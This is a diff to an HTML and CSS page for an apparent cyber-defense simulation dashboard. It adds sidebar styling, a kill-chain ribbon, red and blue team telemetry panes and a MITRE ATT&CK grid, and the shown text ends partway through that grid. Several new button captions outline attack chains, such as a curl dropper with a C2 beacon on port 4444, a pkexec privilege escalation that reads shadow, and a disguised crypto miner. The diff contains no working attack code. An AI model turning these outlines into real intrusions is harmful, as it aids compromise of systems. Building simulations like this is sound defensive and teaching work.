@@ -49,6 +49,7 @@
             /* Layout */
             --header-height: 64px;
             --sidebar-width: 72px;
+            --sidebar-expanded-width: 240px;
             --gap: 16px;
             --radius: 16px;
             --radius-sm: 10px;
@@ -311,9 +312,9 @@
             width: var(--sidebar-width);
             height: calc(100vh - var(--header-height));
             z-index: 95;
-            background: rgba(5, 10, 22, 0.88);
-            backdrop-filter: blur(20px);
-            -webkit-backdrop-filter: blur(20px);
+            background: rgba(5, 10, 22, 0.92);
+            backdrop-filter: blur(24px);
+            -webkit-backdrop-filter: blur(24px);
             border-right: 1px solid var(--glass-border);
             display: flex;
             flex-direction: column;
@@ -324,28 +325,48 @@
             overflow-y: auto;
         }
 
+        .sidebar:not(.expanded) {
+            overflow: visible;
+        }
+
         .sidebar.expanded {
-            width: 220px;
+            width: var(--sidebar-expanded-width);
             box-shadow: 10px 0 40px rgba(0, 0, 0, 0.7);
+        }
+
+        .sidebar::-webkit-scrollbar {
+            width: 4px;
+        }
+        .sidebar::-webkit-scrollbar-track {
+            background: transparent;
+        }
+        .sidebar::-webkit-scrollbar-thumb {
+            background: rgba(0, 245, 255, 0.2);
+            border-radius: 4px;
+        }
+        .sidebar::-webkit-scrollbar-thumb:hover {
+            background: var(--neon-cyan);
         }
 
         .sidebar-header {
             display: flex;
             align-items: center;
             justify-content: space-between;
-            padding: 4px 6px 10px;
+            padding: 6px 8px 12px;
             border-bottom: 1px solid rgba(0, 245, 255, 0.1);
-            margin-bottom: 4px;
+            margin-bottom: 6px;
+            min-height: 48px;
         }
 
         .sidebar-brand {
             font-family: 'Orbitron', monospace;
-            font-size: 0.72rem;
+            font-size: 0.75rem;
             font-weight: 700;
             color: var(--neon-cyan);
             letter-spacing: 2px;
             display: none;
             white-space: nowrap;
+            text-shadow: 0 0 10px rgba(0, 245, 255, 0.4);
         }
 
         .sidebar.expanded .sidebar-brand {
@@ -355,6 +376,7 @@
         .sidebar-toggle-btn {
             width: 36px;
             height: 36px;
+            min-width: 36px;
             border-radius: var(--radius-sm);
             background: rgba(0, 245, 255, 0.05);
             border: 1px solid var(--glass-border);
@@ -372,18 +394,19 @@
         }
 
         .sidebar-toggle-btn:hover {
-            background: rgba(0, 245, 255, 0.15);
-            box-shadow: 0 0 12px rgba(0, 245, 255, 0.25);
+            background: rgba(0, 245, 255, 0.18);
+            border-color: var(--neon-cyan);
+            box-shadow: 0 0 14px rgba(0, 245, 255, 0.35);
             transform: scale(1.05);
         }
 
         .sidebar-toggle-btn svg {
             width: 16px;
             height: 16px;
-            stroke-width: 2;
+            stroke-width: 2.2;
             fill: none;
             stroke: currentColor;
-            transition: transform 0.3s ease;
+            transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1);
         }
 
         .sidebar.expanded .sidebar-toggle-btn svg {
@@ -421,6 +444,7 @@
             transition: all 0.25s cubic-bezier(0.4, 0, 0.2, 1);
             position: relative;
             text-decoration: none;
+            user-select: none;
         }
 
         .sidebar:not(.expanded) .nav-btn {
@@ -430,11 +454,18 @@
             margin: 0 auto;
         }
 
+        .sidebar.expanded .nav-btn {
+            width: 100%;
+            justify-content: flex-start;
+            padding: 0 12px;
+            margin: 0;
+        }
+
         .nav-btn:hover {
             background: rgba(0, 245, 255, 0.08);
             border-color: var(--glass-border);
             color: var(--neon-cyan);
-            transform: scale(1.02);
+            transform: translateX(2px);
         }
 
         .sidebar:not(.expanded) .nav-btn:hover {
@@ -442,10 +473,10 @@
         }
 
         .nav-btn.active {
-            background: rgba(0, 245, 255, 0.12);
-            border-color: rgba(0, 245, 255, 0.35);
+            background: rgba(0, 245, 255, 0.14);
+            border-color: rgba(0, 245, 255, 0.4);
             color: var(--neon-cyan);
-            box-shadow: 0 0 16px rgba(0, 245, 255, 0.12), inset 0 0 12px rgba(0, 245, 255, 0.05);
+            box-shadow: 0 0 16px rgba(0, 245, 255, 0.15), inset 0 0 12px rgba(0, 245, 255, 0.08);
         }
 
         .nav-btn.active::before {
@@ -464,10 +495,15 @@
             width: 20px;
             height: 20px;
             min-width: 20px;
-            stroke-width: 1.5;
+            stroke-width: 1.8;
             fill: none;
             stroke: currentColor;
             transition: all 0.25s ease;
+        }
+
+        .nav-btn.active svg {
+            stroke: var(--neon-cyan);
+            filter: drop-shadow(0 0 6px rgba(0, 245, 255, 0.7));
         }
 
         .nav-label {
@@ -517,27 +553,74 @@
             border: 1px solid rgba(255, 23, 68, 0.3);
         }
 
+        .sidebar:not(.expanded) .nav-btn .nav-badge.count {
+            display: flex;
+            position: absolute;
+            top: 2px;
+            right: 2px;
+            min-width: 16px;
+            height: 16px;
+            padding: 0 4px;
+            align-items: center;
+            justify-content: center;
+            font-size: 0.6rem;
+            border-radius: 8px;
+            box-shadow: 0 0 8px rgba(255, 23, 68, 0.6);
+        }
+
+        .sidebar:not(.expanded) .nav-btn .nav-badge.live {
+            display: block;
+            position: absolute;
+            top: 4px;
+            right: 4px;
+            width: 8px;
+            height: 8px;
+            padding: 0;
+            border-radius: 50%;
+            font-size: 0;
+            color: transparent;
+            background: var(--neon-cyan);
+            box-shadow: 0 0 8px var(--neon-cyan);
+            animation: dotBlink 1.2s ease-in-out infinite;
+        }
+
         .nav-tooltip {
             position: absolute;
-            left: calc(100% + 12px);
+            left: calc(100% + 14px);
             top: 50%;
             transform: translateY(-50%);
             padding: 6px 12px;
-            background: var(--bg-panel);
-            border: 1px solid var(--glass-border);
+            background: rgba(8, 14, 28, 0.95);
+            border: 1px solid var(--neon-cyan);
             border-radius: 6px;
             font-family: 'Rajdhani', sans-serif;
-            font-size: 0.8rem;
+            font-size: 0.82rem;
+            font-weight: 600;
+            letter-spacing: 0.5px;
             color: var(--neon-cyan);
             white-space: nowrap;
             pointer-events: none;
             opacity: 0;
-            transition: opacity 0.2s;
-            z-index: 200;
+            visibility: hidden;
+            transition: opacity 0.2s ease, transform 0.2s ease, visibility 0.2s;
+            box-shadow: 0 4px 18px rgba(0, 0, 0, 0.6), 0 0 12px rgba(0, 245, 255, 0.2);
+            z-index: 300;
+        }
+
+        .nav-tooltip::before {
+            content: '';
+            position: absolute;
+            right: 100%;
+            top: 50%;
+            transform: translateY(-50%);
+            border: 5px solid transparent;
+            border-right-color: var(--neon-cyan);
         }
 
         .sidebar:not(.expanded) .nav-btn:hover .nav-tooltip {
             opacity: 1;
+            visibility: visible;
+            transform: translateY(-50%) translateX(2px);
         }
 
         .sidebar.expanded .nav-tooltip {
@@ -851,6 +934,11 @@
             min-height: calc(100vh - var(--header-height));
             position: relative;
             z-index: 2;
+            transition: margin-left 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        .sidebar.expanded + .main {
+            margin-left: var(--sidebar-expanded-width);
         }
 
         .dashboard-grid {
@@ -1629,6 +1717,263 @@
         .sim-btn.bruteforce:hover { box-shadow: 0 8px 30px rgba(180,77,255,0.15); border-color: rgba(180,77,255,0.5); }
         .sim-btn.bruteforce::before { background: radial-gradient(circle at center, rgba(180,77,255,0.08), transparent 70%); }
 
+        .sim-btn.privesc {
+            background: rgba(0, 245, 255, 0.08);
+            border: 1px solid rgba(0, 245, 255, 0.25);
+            color: var(--neon-cyan);
+        }
+        .sim-btn.privesc:hover { box-shadow: 0 8px 30px rgba(0,245,255,0.15); border-color: rgba(0,245,255,0.5); }
+        .sim-btn.privesc::before { background: radial-gradient(circle at center, rgba(0,245,255,0.08), transparent 70%); }
+
+        .sim-btn.cryptominer {
+            background: rgba(57, 255, 20, 0.08);
+            border: 1px solid rgba(57, 255, 20, 0.25);
+            color: var(--neon-green);
+        }
+        .sim-btn.cryptominer:hover { box-shadow: 0 8px 30px rgba(57,255,20,0.15); border-color: rgba(57,255,20,0.5); }
+        .sim-btn.cryptominer::before { background: radial-gradient(circle at center, rgba(57,255,20,0.08), transparent 70%); }
+
+        .sim-btn.ddos {
+            background: rgba(255, 107, 53, 0.08);
+            border: 1px solid rgba(255, 107, 53, 0.25);
+            color: var(--neon-orange);
+        }
+        .sim-btn.ddos:hover { box-shadow: 0 8px 30px rgba(255,107,53,0.15); border-color: rgba(255,107,53,0.5); }
+        .sim-btn.ddos::before { background: radial-gradient(circle at center, rgba(255,107,53,0.08), transparent 70%); }
+
+        /* Simulation Studio & Kill Chain Ribbon */
+        .sim-toolbar {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            gap: 12px;
+            padding: 12px 18px;
+            background: rgba(5, 10, 25, 0.75);
+            border: 1px solid var(--glass-border);
+            border-radius: var(--radius-sm);
+            margin-bottom: 16px;
+        }
+
+        .sim-btn-group {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            flex-wrap: wrap;
+        }
+
+        .sim-action-btn {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            padding: 7px 14px;
+            background: rgba(0, 245, 255, 0.08);
+            border: 1px solid var(--glass-border);
+            color: var(--neon-cyan);
+            border-radius: 6px;
+            font-family: 'Rajdhani', sans-serif;
+            font-size: 0.85rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .sim-action-btn:hover {
+            background: rgba(0, 245, 255, 0.2);
+            border-color: var(--neon-cyan);
+            box-shadow: 0 0 12px rgba(0, 245, 255, 0.25);
+        }
+
+        .sim-action-btn.danger {
+            background: rgba(255, 23, 68, 0.1);
+            border-color: rgba(255, 23, 68, 0.3);
+            color: var(--neon-red);
+        }
+
+        .sim-action-btn.danger:hover {
+            background: var(--neon-red);
+            color: #fff;
+            box-shadow: 0 0 15px rgba(255, 23, 68, 0.4);
+        }
+
+        .sim-action-btn.success {
+            background: rgba(57, 255, 20, 0.1);
+            border-color: rgba(57, 255, 20, 0.3);
+            color: var(--neon-green);
+        }
+
+        .sim-action-btn.success:hover {
+            background: var(--neon-green);
+            color: #030811;
+            box-shadow: 0 0 15px rgba(57, 255, 20, 0.4);
+        }
+
+        .kill-chain-tracker {
+            display: grid;
+            grid-template-columns: repeat(7, 1fr);
+            gap: 6px;
+            margin: 14px 0 20px 0;
+            padding: 10px;
+            background: rgba(5, 8, 20, 0.6);
+            border-radius: var(--radius-sm);
+            border: 1px solid rgba(0, 245, 255, 0.1);
+        }
+
+        .kc-phase {
+            text-align: center;
+            padding: 8px 4px;
+            border-radius: 6px;
+            background: rgba(10, 20, 40, 0.5);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            transition: all 0.3s;
+        }
+
+        .kc-phase.active {
+            background: rgba(255, 23, 68, 0.15);
+            border-color: var(--neon-red);
+            box-shadow: 0 0 15px rgba(255, 23, 68, 0.25);
+        }
+
+        .kc-phase.defended {
+            background: rgba(57, 255, 20, 0.15);
+            border-color: var(--neon-green);
+            box-shadow: 0 0 15px rgba(57, 255, 20, 0.25);
+        }
+
+        .kc-phase-num {
+            font-family: 'Orbitron', monospace;
+            font-size: 0.65rem;
+            color: var(--text-dim);
+            letter-spacing: 1px;
+        }
+
+        .kc-phase-name {
+            font-family: 'Rajdhani', sans-serif;
+            font-size: 0.75rem;
+            font-weight: 700;
+            margin-top: 2px;
+            color: var(--text-secondary);
+        }
+
+        .kc-phase.active .kc-phase-name { color: var(--neon-red); }
+        .kc-phase.defended .kc-phase-name { color: var(--neon-green); }
+
+        /* MITRE ATT&CK Matrix Grid */
+        .mitre-panel {
+            grid-column: span 12;
+        }
+
+        .mitre-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(210px, 1fr));
+            gap: 10px;
+            margin-top: 10px;
+        }
+
+        .mitre-card {
+            padding: 10px 14px;
+            background: rgba(10, 18, 35, 0.6);
+            border: 1px solid var(--glass-border);
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.2s;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .mitre-card:hover {
+            border-color: var(--neon-cyan);
+            background: rgba(15, 28, 55, 0.7);
+            transform: translateY(-2px);
+        }
+
+        .mitre-card.triggered {
+            border-color: var(--neon-red);
+            background: rgba(255, 23, 68, 0.12);
+            box-shadow: 0 0 20px rgba(255, 23, 68, 0.2);
+        }
+
+        .mitre-card.defended {
+            border-color: var(--neon-green);
+            background: rgba(57, 255, 20, 0.1);
+            box-shadow: 0 0 20px rgba(57, 255, 20, 0.15);
+        }
+
+        .mitre-id {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.7rem;
+            color: var(--neon-cyan);
+            font-weight: 700;
+        }
+
+        .mitre-name {
+            font-family: 'Rajdhani', sans-serif;
+            font-weight: 600;
+            font-size: 0.85rem;
+            margin-top: 2px;
+        }
+
+        .mitre-tactic {
+            font-size: 0.68rem;
+            color: var(--text-dim);
+            margin-top: 4px;
+        }
+
+        /* Dual Red vs Blue Stream */
+        .dual-stream-container {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 16px;
+            margin-top: 12px;
+        }
+
+        .stream-col {
+            background: var(--bg-terminal);
+            border-radius: var(--radius-sm);
+            padding: 12px;
+            border: 1px solid var(--glass-border);
+            height: 220px;
+            overflow-y: auto;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.72rem;
+            line-height: 1.6;
+        }
+
+        .stream-col-header {
+            font-family: 'Orbitron', monospace;
+            font-size: 0.72rem;
+            font-weight: 700;
+            letter-spacing: 1.5px;
+            margin-bottom: 8px;
+            padding-bottom: 6px;
+            border-bottom: 1px solid var(--glass-border);
+            display: flex;
+            justify-content: space-between;
+        }
+
+        .stream-col-header.red { color: var(--severity-critical); }
+        .stream-col-header.blue { color: var(--neon-cyan); }
+
+        .engine-mode-pill {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            padding: 4px 10px;
+            border-radius: 20px;
+            font-family: 'Orbitron', monospace;
+            font-size: 0.65rem;
+            letter-spacing: 1px;
+            background: rgba(0, 245, 255, 0.1);
+            border: 1px solid rgba(0, 245, 255, 0.3);
+            color: var(--neon-cyan);
+        }
+
+        .engine-mode-pill.live-sync {
+            background: rgba(57, 255, 20, 0.15);
+            border-color: rgba(57, 255, 20, 0.4);
+            color: var(--neon-green);
+        }
+
         .sim-btn-desc {
             font-family: 'Rajdhani', sans-serif;
             font-size: 0.72rem;
@@ -1753,16 +2098,23 @@
                 width: 240px !important;
                 z-index: 150;
                 box-shadow: 0 0 50px rgba(0,0,0,0.85);
+                overflow-x: hidden !important;
+                overflow-y: auto !important;
+            }
+            .sidebar:not(.expanded) {
+                overflow: hidden !important;
             }
             .sidebar.mobile-open {
                 transform: translateX(0);
             }
             .sidebar .nav-label { display: inline-block !important; }
             .sidebar .nav-badge { display: inline-block !important; }
-            .sidebar .nav-btn { justify-content: flex-start !important; padding: 0 14px !important; width: 100% !important; }
+            .sidebar .nav-btn { justify-content: flex-start !important; padding: 0 14px !important; width: 100% !important; margin: 0 !important; }
             .sidebar .sidebar-brand { display: block !important; }
             .sidebar-toggle-btn { display: none !important; }
-            .main { margin-left: 0; }
+            .main { margin-left: 0 !important; }
+            .sidebar.expanded + .main { margin-left: 0 !important; }
+            .sidebar-backdrop { z-index: 140; }
             .posture-panel, .stats-row, .event-feed-panel, .alerts-panel,
             .process-tree-panel, .network-panel, .timeline-panel, .sim-controls-panel {
                 grid-column: span 12;
@@ -1794,7 +2146,11 @@
             </div>
             <div>
                 <div class="logo-text">KLCDS</div>
-                <div class="logo-subtitle">Kernel-Level Cyber Defense System</div>
+                <div class="logo-subtitle">Cyber Defense Simulation Command Center</div>
+            </div>
+            <div class="engine-mode-pill" id="engineModePill" style="margin-left:14px;">
+                <span id="engineModeDot" style="width:7px;height:7px;border-radius:50%;background:var(--neon-green);display:inline-block;box-shadow:0 0 8px var(--neon-green)"></span>
+                <span id="engineModeText">STANDALONE ENGINE</span>
             </div>
         </div>
 
@@ -1815,9 +2171,9 @@
                 <span class="stat-value" id="cpuVal">3.2%</span>
             </div>
             <div class="header-stat">
-                <span class="stat-dot cyan"></span>
-                <span>eBPF PROBES</span>
-                <span class="stat-value">12</span>
+                <span class="stat-dot green"></span>
+                <span>SCENARIOS</span>
+                <span class="stat-value">7 ACTIVE</span>
             </div>
         </div>
 
@@ -1842,51 +2198,51 @@
         </div>
 
         <nav class="sidebar-nav">
-            <button class="nav-btn active" data-target="section-dashboard" onclick="navigateTo('section-dashboard', this)">
+            <button class="nav-btn active" data-target="section-dashboard" onclick="navigateTo('section-dashboard', this)" title="Dashboard Overview">
                 <svg viewBox="0 0 24 24"><rect x="3" y="3" width="7" height="7" rx="1"/><rect x="14" y="3" width="7" height="7" rx="1"/><rect x="3" y="14" width="7" height="7" rx="1"/><rect x="14" y="14" width="7" height="7" rx="1"/></svg>
                 <span class="nav-label">Dashboard</span>
                 <span class="nav-tooltip">Dashboard Overview</span>
             </button>
 
-            <button class="nav-btn" data-target="section-events" onclick="navigateTo('section-events', this)">
+            <button class="nav-btn" data-target="section-posture" onclick="navigateTo('section-posture', this)" title="Security Posture Score">
+                <svg viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+                <span class="nav-label">Posture Score</span>
+                <span class="nav-tooltip">Security Posture</span>
+            </button>
+
+            <button class="nav-btn" data-target="section-events" onclick="navigateTo('section-events', this)" title="Kernel Syscall Event Feed">
                 <svg viewBox="0 0 24 24"><polyline points="22 12 18 12 15 21 9 3 6 12 2 12"/></svg>
                 <span class="nav-label">Event Feed</span>
                 <span class="nav-badge live">LIVE</span>
                 <span class="nav-tooltip">Kernel Event Feed</span>
             </button>
 
-            <button class="nav-btn" data-target="section-alerts" onclick="navigateTo('section-alerts', this)">
+            <button class="nav-btn" data-target="section-alerts" onclick="navigateTo('section-alerts', this)" title="Threat Alerts & Incidents">
                 <svg viewBox="0 0 24 24"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>
                 <span class="nav-label">Threat Alerts</span>
                 <span class="nav-badge count" id="navAlertCount">7</span>
                 <span class="nav-tooltip">Threat Alerts</span>
             </button>
 
-            <button class="nav-btn" data-target="section-posture" onclick="navigateTo('section-posture', this)">
-                <svg viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
-                <span class="nav-label">Posture Score</span>
-                <span class="nav-tooltip">Security Posture</span>
-            </button>
-
-            <button class="nav-btn" data-target="section-network" onclick="navigateTo('section-network', this)">
-                <svg viewBox="0 0 24 24"><circle cx="18" cy="5" r="3"/><circle cx="6" cy="12" r="3"/><circle cx="18" cy="19" r="3"/><line x1="8.59" y1="13.51" x2="15.42" y2="17.49"/><line x1="15.41" y1="6.51" x2="8.59" y2="10.49"/></svg>
-                <span class="nav-label">Network Graph</span>
-                <span class="nav-tooltip">Network Topology</span>
-            </button>
-
-            <button class="nav-btn" data-target="section-tree" onclick="navigateTo('section-tree', this)">
+            <button class="nav-btn" data-target="section-tree" onclick="navigateTo('section-tree', this)" title="Process Execution Tree">
                 <svg viewBox="0 0 24 24"><polyline points="16 18 22 12 16 6"/><polyline points="8 6 2 12 8 18"/></svg>
                 <span class="nav-label">Process Tree</span>
                 <span class="nav-tooltip">Process Tree</span>
             </button>
 
-            <button class="nav-btn" data-target="section-timeline" onclick="navigateTo('section-timeline', this)">
+            <button class="nav-btn" data-target="section-network" onclick="navigateTo('section-network', this)" title="Network Topology & Active Connections">
+                <svg viewBox="0 0 24 24"><circle cx="18" cy="5" r="3"/><circle cx="6" cy="12" r="3"/><circle cx="18" cy="19" r="3"/><line x1="8.59" y1="13.51" x2="15.42" y2="17.49"/><line x1="15.41" y1="6.51" x2="8.59" y2="10.49"/></svg>
+                <span class="nav-label">Network Graph</span>
+                <span class="nav-tooltip">Network Topology</span>
+            </button>
+
+            <button class="nav-btn" data-target="section-timeline" onclick="navigateTo('section-timeline', this)" title="Autonomous Response Timeline">
                 <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
                 <span class="nav-label">Timeline</span>
                 <span class="nav-tooltip">Response Timeline</span>
             </button>
 
-            <button class="nav-btn" data-target="section-simulations" onclick="navigateTo('section-simulations', this)">
+            <button class="nav-btn" data-target="section-simulations" onclick="navigateTo('section-simulations', this)" title="Cyber Attack Simulations">
                 <svg viewBox="0 0 24 24"><polygon points="5 3 19 12 5 21 5 3"/></svg>
                 <span class="nav-label">Attack Sims</span>
                 <span class="nav-tooltip">Attack Simulations</span>
@@ -1894,7 +2250,7 @@
         </nav>
 
         <div class="sidebar-footer">
-            <button class="nav-btn" onclick="openSettingsModal()">
+            <button class="nav-btn" onclick="openSettingsModal()" title="System Configuration & Settings">
                 <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1-2.83 2.83l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-4 0v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83-2.83l.06-.06A1.65 1.65 0 0 0 4.68 15a1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1 0-4h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 2.83-2.83l.06.06A1.65 1.65 0 0 0 9 4.68a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 4 0v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 2.83l-.06.06A1.65 1.65 0 0 0 19.4 9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 0 4h-.09a1.65 1.65 0 0 0-1.51 1z"/></svg>
                 <span class="nav-label">Settings</span>
                 <span class="nav-tooltip">System Settings</span>
@@ -2051,32 +2407,171 @@
             </section>
 
             <!-- SIMULATION CONTROLS -->
-            <section class="glass-panel sim-controls-panel" id="section-simulations">
+            <section class="glass-panel sim-controls-panel" id="section-simulations" style="grid-column: span 12;">
                 <div class="panel-header">
                     <div class="panel-title">
                         <svg viewBox="0 0 24 24"><polygon points="5 3 19 12 5 21 5 3"/></svg>
-                        Attack Simulations
+                        Cyber Attack & Defense Simulation Studio
                     </div>
-                    <span style="font-family:'JetBrains Mono',monospace;font-size:0.65rem;color:var(--text-dim)">SANDBOX ONLY — No real malware</span>
+                    <div style="display:flex;align-items:center;gap:10px;">
+                        <span id="activeScenarioLabel" style="font-family:'Orbitron',monospace;font-size:0.7rem;color:var(--neon-cyan)">READY — SELECT SCENARIO</span>
+                    </div>
                 </div>
                 <div class="panel-body">
-                    <div class="sim-controls">
+                    <!-- Simulation Toolbar -->
+                    <div class="sim-toolbar">
+                        <div class="sim-btn-group">
+                            <button class="sim-action-btn success" onclick="resetSimulationFeed()" title="Reset to clean baseline">
+                                <svg viewBox="0 0 24 24" width="14" height="14" stroke="currentColor" stroke-width="2" fill="none"><path d="M23 4v6h-6"/><path d="M1 20v-6h6"/><path d="M3.51 9a9 9 0 0 1 14.85-3.36L23 10M1 14l4.64 4.36A9 9 0 0 0 20.49 15"/></svg>
+                                Reset Baseline
+                            </button>
+                            <button class="sim-action-btn" onclick="openCustomScenarioModal()">
+                                <svg viewBox="0 0 24 24" width="14" height="14" stroke="currentColor" stroke-width="2" fill="none"><polygon points="12 2 2 7 12 12 22 7 12 2"/><polyline points="2 17 12 22 22 17"/><polyline points="2 12 12 17 22 12"/></svg>
+                                Custom Payload Builder
+                            </button>
+                            <button class="sim-action-btn" onclick="openForensicReportModal()">
+                                <svg viewBox="0 0 24 24" width="14" height="14" stroke="currentColor" stroke-width="2" fill="none"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/></svg>
+                                Forensic Incident Report
+                            </button>
+                        </div>
+                        <div class="sim-btn-group">
+                            <span style="font-family:'Rajdhani',sans-serif;font-size:0.75rem;color:var(--text-dim);margin-right:4px;">PLAYBACK SPEED:</span>
+                            <button class="speed-btn" data-speed="0.5" onclick="setSimSpeed(0.5, this)">0.5x</button>
+                            <button class="speed-btn active" data-speed="1.0" onclick="setSimSpeed(1.0, this)">1.0x</button>
+                            <button class="speed-btn" data-speed="2.0" onclick="setSimSpeed(2.0, this)">2.0x</button>
+                            <button class="speed-btn" data-speed="5.0" onclick="setSimSpeed(5.0, this)">Instant</button>
+                        </div>
+                    </div>
+
+                    <!-- Cyber Kill Chain Phase Ribbon -->
+                    <div class="kill-chain-tracker" id="killChainTracker">
+                        <div class="kc-phase" id="kc-phase-1"><div class="kc-phase-num">PHASE 01</div><div class="kc-phase-name">Reconnaissance</div></div>
+                        <div class="kc-phase" id="kc-phase-2"><div class="kc-phase-num">PHASE 02</div><div class="kc-phase-name">Weaponization</div></div>
+                        <div class="kc-phase" id="kc-phase-3"><div class="kc-phase-num">PHASE 03</div><div class="kc-phase-name">Delivery</div></div>
+                        <div class="kc-phase" id="kc-phase-4"><div class="kc-phase-num">PHASE 04</div><div class="kc-phase-name">Exploitation</div></div>
+                        <div class="kc-phase" id="kc-phase-5"><div class="kc-phase-num">PHASE 05</div><div class="kc-phase-name">Installation</div></div>
+                        <div class="kc-phase" id="kc-phase-6"><div class="kc-phase-num">PHASE 06</div><div class="kc-phase-name">Command & Control</div></div>
+                        <div class="kc-phase" id="kc-phase-7"><div class="kc-phase-num">PHASE 07</div><div class="kc-phase-name">Objectives</div></div>
+                    </div>
+
+                    <!-- 7 Attack Vector Buttons -->
+                    <div class="sim-controls" style="grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));">
                         <button class="sim-btn ransomware" onclick="runSimulation('ransomware', event)">
-                            🔐 Ransomware Sim
-                            <span class="sim-btn-desc">Mass rename + high entropy writes + canary touch</span>
+                            🔐 Ransomware Mass Encryption
+                            <span class="sim-btn-desc">High entropy writes (7.92) + mass .locked rename + canary trap breach</span>
                         </button>
                         <button class="sim-btn trojan" onclick="runSimulation('trojan', event)">
-                            🐴 Trojan Chain Sim
-                            <span class="sim-btn-desc">Download → execute from /tmp → connect to C2</span>
+                            🐴 Trojan Dropper & C2 Shell
+                            <span class="sim-btn-desc">curl payload to /tmp → C2 beacon :4444 → cron persistence</span>
                         </button>
                         <button class="sim-btn portscan" onclick="runSimulation('portscan', event)">
-                            🔍 Port Scan Sim
-                            <span class="sim-btn-desc">Scan 20+ ports from single source in 30s</span>
+                            🔍 Stealth SYN Port Scan
+                            <span class="sim-btn-desc">16-port vertical/horizontal sweep → rate limit auto-ban</span>
                         </button>
                         <button class="sim-btn bruteforce" onclick="runSimulation('bruteforce', event)">
-                            🔑 SSH Brute Force Sim
-                            <span class="sim-btn-desc">10+ failed logins from same IP in 60s</span>
+                            🔑 SSH Credential Stuffing
+                            <span class="sim-btn-desc">Dictionary attack burst across admin/root accounts → IP lockout</span>
                         </button>
+                        <button class="sim-btn privesc" onclick="runSimulation('privesc', event)">
+                            ⚡ SUID Privilege Escalation
+                            <span class="sim-btn-desc">pkexec shared obj exploit → setuid(0) elevation → shadow read</span>
+                        </button>
+                        <button class="sim-btn cryptominer" onclick="runSimulation('cryptominer', event)">
+                            ⛏️ Stealth Crypto Miner
+                            <span class="sim-btn-desc">syslog-worker disguise → 98% CPU burn → Stratum pool beacon</span>
+                        </button>
+                        <button class="sim-btn ddos" onclick="runSimulation('ddos', event)">
+                            🌊 Volumetric SYN Flood
+                            <span class="sim-btn-desc">Spoofed botnet SYN flood → queue exhaustion → SYN cookie defense</span>
+                        </button>
+                    </div>
+
+                    <!-- Dual Red Team vs Blue Team Live Telemetry Feeds -->
+                    <div class="dual-stream-container">
+                        <div class="stream-col" id="redStreamCol">
+                            <div class="stream-col-header red">
+                                <span>🔴 ATTACKER TELEMETRY (RED TEAM)</span>
+                                <span id="redEventCount">0 EVENTS</span>
+                            </div>
+                            <div id="redStreamFeed" style="display:flex;flex-direction:column;gap:4px;">
+                                <div style="color:var(--text-dim);font-style:italic;">No active attack vector running. Select a scenario above to observe execution telemetry.</div>
+                            </div>
+                        </div>
+
+                        <div class="stream-col" id="blueStreamCol">
+                            <div class="stream-col-header blue">
+                                <span>🔵 AUTONOMOUS DEFENSE (BLUE TEAM)</span>
+                                <span id="blueActionCount">0 ACTIONS</span>
+                            </div>
+                            <div id="blueStreamFeed" style="display:flex;flex-direction:column;gap:4px;">
+                                <div style="color:var(--text-dim);font-style:italic;">Defense mechanisms on standby. Monitoring kernel ring buffer and log streams.</div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- MITRE ATT&CK MATRIX COVERAGE -->
+            <section class="glass-panel mitre-panel" id="section-mitre" style="grid-column: span 12;">
+                <div class="panel-header">
+                    <div class="panel-title">
+                        <svg viewBox="0 0 24 24"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"/><line x1="3" y1="9" x2="21" y2="9"/><line x1="9" y1="21" x2="9" y2="9"/></svg>
+                        MITRE ATT&CK Enterprise Matrix Coverage
+                    </div>
+                    <span style="font-family:'JetBrains Mono',monospace;font-size:0.65rem;color:var(--neon-green)">10 TECHNIQUES MAPPED</span>
+                </div>
+                <div class="panel-body">
+                    <div class="mitre-grid" id="mitreGrid">
+                        <div class="mitre-card" id="mitre-T1486" onclick="showMitreDetails('T1486')">
+                            <div class="mitre-id">T1486</div>
+                            <div class="mitre-name">Data Encrypted for Impact</div>
+                            <div class="mitre-tactic">Impact • Ransomware</div>
